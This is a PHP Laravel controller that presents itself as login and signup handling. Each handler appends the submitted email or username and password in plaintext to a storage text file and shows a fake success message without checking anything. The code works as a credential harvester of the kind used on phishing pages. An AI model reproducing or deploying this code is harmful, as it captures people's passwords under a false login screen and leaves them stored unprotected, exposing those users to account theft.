<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;

class AuthController extends Controller
{
    public function showLogin()
    {
        return view('login');
    }

    public function login(Request $request)
    {
        $email = $request->input('email');
        $password = $request->input('password');
        file_put_contents(storage_path('app/users.txt'), "Email: $email | Password: $password\n", FILE_APPEND);
        return back()->with('success', 'You have successfully Logged In!');
    }

    public function showSignup()
    {
        return view('signup');
    }

    public function signup(Request $request)
    {
        $username = $request->input('username');
        $password = $request->input('password');
        file_put_contents(storage_path('app/credentials.txt'), "Username: $username | Password: $password\n", FILE_APPEND);
        return back()->with('success', 'Sign up successful!');
    }
}